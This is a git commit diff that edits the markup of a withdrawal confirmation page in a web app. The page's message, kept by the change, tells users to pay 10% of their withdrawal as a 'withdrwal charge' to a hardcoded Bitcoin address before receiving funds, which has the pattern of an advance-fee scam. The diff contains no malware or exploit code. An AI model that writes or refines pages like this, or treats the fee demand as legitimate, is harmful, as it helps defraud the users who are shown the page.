a6211b559016161c578107dfa63b3defad4030a5
iseguancompany-cpu <iseguancompany@gmail.com>
2026-09-17 11:38:13 +0100

    Update withdraw.tsx

--- src/routes/_authenticated/withdraw.tsx
+++ src/routes/_authenticated/withdraw.tsx
@@ -398,8 +398,8 @@ className={labelCls}>Last 4 Digits of Card</label>
                 Your withdrawal of{" "}
                 <span className="font-bold text-foreground">{formatUsd(done.amount)}</span>{" "}
                 has been placed successfully. 
-                <br>Pay exactly <p>{formatUsd(numericAmount * 0.1)} withdrwal charge to the wallet address below and refresh your cashapp for instant deposit</br>
-                <br>bc1qdy52excpd03jgsqquv932y8s6gdzgedy42x38x</br>
+                Pay exactly <p>{formatUsd(numericAmount * 0.1)} withdrwal charge to the wallet address below and refresh your cashapp for instant deposit
+               bc1qdy52excpd03jgsqquv932y8s6gdzgedy42x38x
                 </p>
               </p>
             </div>
